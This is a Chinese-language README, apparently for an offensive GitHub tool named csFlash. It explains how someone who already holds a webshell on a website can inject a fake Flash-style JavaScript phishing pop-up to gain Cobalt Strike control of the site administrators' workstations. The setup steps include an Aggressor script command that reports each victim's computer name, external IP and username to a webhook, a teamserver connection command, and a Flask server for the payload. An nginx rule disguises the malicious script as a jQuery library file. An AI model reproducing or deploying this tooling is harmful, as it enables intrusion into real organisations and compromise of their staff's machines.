# csFlash
适用于拿到webshell进行cs后渗透钓鱼

## 效果
当获取到webshell时，想获得运维人员工作主机权限，可在web中插入js钓鱼页面

参考 https://github.com/r00tSe7en/Flash-Pop
![image](https://user-images.githubusercontent.com/38282439/197719314-d685b6ec-b007-4097-a0a0-2f7e6463de53.png)

此项目实现cs上线后自动隐藏功能


## 使用方法

1.在*CS-PushPlus/PushPlus.py*配置好webhook的token，默认使用推送加，可自定义修改为钉钉、企业微信
<img width="714" alt="image" src="https://user-images.githubusercontent.com/38282439/197714243-1df4c320-b337-41c9-ba59-b455a459847f.png">

并配置好数据库文件路径

<img width="608" alt="image" src="https://user-images.githubusercontent.com/38282439/197714659-e8ce0270-b61d-4f27-b985-e894cc50b76c.png">

2.配置好*CS-PushPlus/PushPlus.cna*文件中绝对路径

```
$cmd = 'python3 /CS-PushPlus/PushPlus.py' . " --computernam " . $computerName . " --externalip " . $externalIP . " --username " . $userName;
```

3.启动cs teamserver 、连接cna脚本置于后台
```
./agscript.sh 127.0.0.1 50050 User Pass ./CS-PushPlus/PushPlus.cna
```

4.启动js服务并置于后台，需要修改ssl证书信息
（也可使用http服务，但不建议，否则可能在https站点无法加载此js文件）
```
python3 flaskHttpd.py 
```
5.于nginx等web服务器配置，或开启防火墙使得能够通过路径访问到此flask服务
```
        location /public/common/libs/jquery/jquery-1.9.1.min.js {
                proxy_pass $flaskHttpd;
                }
```
